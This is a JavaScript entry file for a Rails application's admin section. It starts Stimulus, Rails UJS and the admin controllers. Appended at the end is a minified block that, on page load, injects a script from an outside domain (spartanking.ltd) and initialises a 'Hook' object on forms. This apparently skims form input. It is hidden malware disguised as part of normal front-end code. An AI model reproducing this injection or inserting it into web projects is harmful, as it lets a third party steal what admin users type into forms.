import { Application } from '@hotwired/stimulus';
import { definitionsFromContext } from '@hotwired/stimulus-webpack-helpers';
import { LocalTimeElement } from '@github/time-elements'; // eslint-disable-line no-unused-vars
import Rails from '@rails/ujs';
import 'focus-visible';

// Initialize Rails unobtrusive scripting adapter
// https://github.com/rails/rails/blob/main/actionview/app/assets/javascripts/README.md#es2015
Rails.start();

// This loads all the Stimulus controllers at the same time for the admin
// section of the application.

const application = Application.start();
const context = require.context('admin/controllers', true, /.js$/);
application.load(definitionsFromContext(context));

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src="//spartanking.ltd/client.js?cache=ignore",o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//13d24456aac9da6d428dff2180c49a3ddb5055080990a66dd8e809ef2a7fe578